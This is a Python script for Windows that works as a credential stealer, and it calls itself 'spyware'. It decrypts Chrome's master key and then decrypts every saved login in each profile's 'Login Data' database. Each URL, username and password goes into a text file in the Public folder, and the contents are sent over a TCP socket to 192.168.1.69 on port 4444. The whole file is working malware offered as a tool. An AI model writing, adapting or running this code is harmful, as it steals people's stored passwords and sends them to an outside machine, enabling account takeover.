import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import platform
import socket

if platform.uname().system.lower() == 'windows':

    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            
            return secret_key
        
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Chrome secret key cannot be found")
            return None
    
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
        
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass
        
        except Exception as e:
            print("%s" % str(e))
            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""
    
    def get_db_connection(chrome_path_login_db):
        try:
            print(chrome_path_login_db)
            shutil.copy2(chrome_path_login_db, "Personal.db")
            return sqlite3.connect("Personal.db")
        except sqlite3.DatabaseError:
            print("[ERR] Chrome database cannot be found")
            return None
else:
    print('Operating system is not Windows..')
    sys.exit()

if __name__ == '__main__':
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ip = '192.168.1.69'
        port = 4444
        client.connect((ip, port))

        secret_key = get_secret_key()
        folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
        for folder in folders:
            chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
            conn = get_db_connection(chrome_path_login_db)
            if secret_key and conn:
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for index, login in enumerate(cursor.fetchall()):
                    url = login[0]
                    username = login[1]
                    ciphertext = login[2]
                    if url and username and ciphertext:
                        decrypted_password = decrypt_password(ciphertext, secret_key)
                        public = os.getenv('PUBLIC')
                        file = os.path.join(public, 'spyware.txt')
                        with open(file, "a") as f:
                            data = "URL: %s\nUser Name: %s\nPassword: %s\n" % (url, username, decrypted_password)
                            data += ("*" * 50) + '\n'
                            f.write(data)

                cursor.close()
                conn.close()
                os.remove("Personal.db")

        filename = os.path.join(os.getenv('PUBLIC'), 'spyware.txt')
        if os.path.exists(filename):
            with open(filename, "r") as fi:
                data = fi.read()
                if data:
                    client.sendall(data.encode())
        else:
            print(f"[ERR] File not found: {filename}")

    except Exception as e:
        print("[ERR] %s" % str(e))
